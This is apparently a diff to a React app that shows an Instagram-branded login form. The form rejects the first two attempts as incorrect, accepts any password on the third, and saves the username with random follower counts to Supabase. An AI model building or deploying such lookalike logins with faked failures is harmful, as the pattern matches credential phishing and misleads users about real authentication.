@@ -1,5 +1,6 @@
 import React, { useState } from 'react';
 import { Instagram, Eye, EyeOff } from 'lucide-react';
+import { supabase, type User } from './lib/supabase';
 
 function App() {
   const [username, setUsername] = useState('');
@@ -10,8 +11,9 @@ function App() {
   const [message, setMessage] = useState('');
   const [likes, setLikes] = useState(0);
   const [followers, setFollowers] = useState(0);
+  const [loading, setLoading] = useState(false);
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
     if (!username.trim() || !password.trim()) {
@@ -19,21 +21,67 @@ function App() {
       return;
     }
 
+    setLoading(true);
     const newAttempts = attempts + 1;
     setAttempts(newAttempts);
 
     if (newAttempts < 3) {
       setMessage('Username or password is incorrect');
       setIsSuccess(false);
+      setLoading(false);
     } else {
-      // Generate random numbers for likes and followers
-      const randomLikes = Math.floor(Math.random() * 10000) + 1000;
-      const randomFollowers = Math.floor(Math.random() * 5000) + 500;
-      
-      setLikes(randomLikes);
-      setFollowers(randomFollowers);
-      setMessage('Login successful — welcome!');
-      setIsSuccess(true);
+      try {
+        // Try to fetch user data from Supabase
+        const { data: userData, error } = await supabase
+          .from('users')
+          .select('*')
+          .eq('username', username.trim())
+          .single();
+
+        if (error || !userData) {
+          // If user doesn't exist, create with random data
+          const randomLikes = Math.floor(Math.random() * 10000) + 1000;
+          const randomFollowers = Math.floor(Math.random() * 5000) + 500;
+          
+          const { data: newUser, error: insertError } = await supabase
+            .from('users')
+            .insert({
+              username: username.trim(),
+              email: `${username.trim()}@example.com`,
+              followers_count: randomFollowers,
+              likes_count: randomLikes
+            })
+            .select()
+            .single();
+
+          if (insertError) {
+            console.error('Error creating user:', insertError);
+            setLikes(randomLikes);
+            setFollowers(randomFollowers);
+          } else {
+            setLikes(newUser.likes_count);
+            setFollowers(newUser.followers_count);
+          }
+        } else {
+          // Use existing user data
+          setLikes(userData.likes_count);
+          setFollowers(userData.followers_count);
+        }
+        
+        setMessage('Login successful — welcome!');
+        setIsSuccess(true);
+      } catch (error) {
+        console.error('Error:', error);
+        // Fallback to random numbers if Supabase fails
+        const randomLikes = Math.floor(Math.random() * 10000) + 1000;
+        const randomFollowers = Math.floor(Math.random() * 5000) + 500;
+        setLikes(randomLikes);
+        setFollowers(randomFollowers);
+        setMessage('Login successful — welcome!');
+        setIsSuccess(true);
+      } finally {
+        setLoading(false);
+      }
     }
   };
 
@@ -46,6 +94,7 @@ function App() {
     setLikes(0);
     setFollowers(0);
     setShowPassword(false);
+    setLoading(false);
   };
 
   const formatNumber = (num: number) => {
@@ -146,10 +195,10 @@ function App() {
               {/* Login Button */}
               <button
                 type="submit"
-                disabled={!username.trim() || !password.trim()}
+                disabled={!username.trim() || !password.trim() || loading}
                 className="w-full bg-blue-500 hover:bg-blue-600 disabled:bg-blue-300 disabled:cursor-not-allowed text-white font-medium py-2 px-4 rounded-md transition-colors duration-200 text-sm"
               >
-                Log In
+                {loading ? 'Logging in...' : 'Log In'}
               </button>
 
               {/* Divider */}
